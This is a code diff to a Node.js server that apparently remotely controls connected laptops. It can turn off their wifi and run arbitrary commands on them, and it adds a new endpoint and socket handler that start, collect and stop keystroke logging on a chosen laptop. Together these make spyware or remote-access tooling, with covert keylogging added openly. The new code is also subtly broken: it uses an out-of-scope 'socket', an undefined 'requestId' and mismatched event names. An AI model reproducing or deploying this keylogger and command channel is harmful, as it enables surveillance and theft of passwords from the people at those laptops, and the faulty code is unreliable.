@@ -92,7 +92,7 @@ app.get("/api/laptops", (req, res) => {
 
 // API endpoint to turn off wifi
 app.post("/api/control/wifi/off", checkApiKey, (req, res) => {
-  const { laptopId, type } = req.body;
+  const { laptopId, type, timer } = req.body;
 
   if (!laptopId) {
     return res
@@ -123,7 +123,7 @@ app.post("/api/control/wifi/off", checkApiKey, (req, res) => {
 
   console.log(type);
   // ✅ Emit only once with requestId
-  io.to(laptopId).emit("command", { type: type, requestId });
+  io.to(laptopId).emit("command", { type: type, timer, requestId });
 });
 
 // API endpoint to execute command
@@ -131,7 +131,6 @@ app.post("/api/control/execute", checkApiKey, (req, res) => {
   const { laptopId, command } = req.body;
 
   console.log("Received execute request:", { laptopId, command }); // Enhanced logging
-  console.log("Connected Laptops:", Array.from(connectedLaptops.keys())); // Log connected laptop IDs
 
   if (!laptopId || !command) {
     console.log("Missing laptopId or command"); // Logging
@@ -161,7 +160,7 @@ app.post("/api/control/execute", checkApiKey, (req, res) => {
         .status(408)
         .json({ success: false, message: "Request timed out" });
     }
-  }, 500000);
+  }, 10000);
 
   // Send command to the specific laptop
   console.log(`Emitting command to laptop ${laptopId}`); // Logging
@@ -172,7 +171,65 @@ app.post("/api/control/execute", checkApiKey, (req, res) => {
   });
 });
 
-// Socket.IO connection handling
+// API endpoint to take a keylogger tracking
+
+app.post("/api/control/keylogger", checkApiKey, (req, res) => {
+  const { laptopId, duration = 5000 } = req.body;
+
+  if (!laptopId) {
+    return res
+      .status(400)
+      .json({ success: false, message: "Laptop ID is required" });
+  }
+
+  const laptop = connectedLaptops.get(laptopId);
+  if (!laptop) {
+    return res
+      .status(404)
+      .json({ success: false, message: "Laptop not found or not connected" });
+  }
+
+  const requestId = Date.now().toString();
+  const collectedKeys = [];
+
+  // Register listener for incoming keys
+  const keyListener = (data) => {
+    if (data && data.requestId === requestId) {
+      collectedKeys.push({
+        key: data.key,
+        keycode: data.keycode,
+        timestamp: data.timestamp,
+      });
+    }
+  };
+
+  // Temporary listener for this keylogging session
+  socket.on("keylog", keyListener);
+
+  // Send start keylogging command to laptop
+  io.to(laptopId).emit("command", {
+    type: "keylog-start",
+    requestId,
+  });
+
+  // Stop keylogger and respond after duration
+  setTimeout(() => {
+    socket.off("keylog", keyListener); // Stop collecting keys
+
+    // Tell the client to stop
+    io.to(laptopId).emit("command", {
+      type: "keylog-stop",
+      requestId,
+    });
+
+    res.json({
+      success: true,
+      message: `Captured ${collectedKeys.length} keys`,
+      keys: collectedKeys,
+    });
+  }, duration);
+});
+
 io.on("connection", (socket) => {
   console.log("New client connected:", socket.id);
 
@@ -218,6 +275,21 @@ io.on("connection", (socket) => {
       res.json({ success, message, output });
     } else {
       console.log("No matching pending request found"); // Logging
+    }
+  });
+
+  // keylogger socket
+  socket.on("keylogger", (data) => {
+    const { key, timestamp } = data;
+    console.log(`Key pressed: ${key} at ${timestamp}`); // Log key pressed
+    const laptop = connectedLaptops.get(socket.id);
+    if (laptop && laptop.pendingRequests.has(requestId)) {
+      const { res } = laptop.pendingRequests.get(requestId);
+      laptop.pendingRequests.delete(requestId);
+      // Send the keylogger data back to the original request
+      res.json({ success: true, key, timestamp });
+    } else {
+      console.log("No key matching pending request found");
     }
   });
 
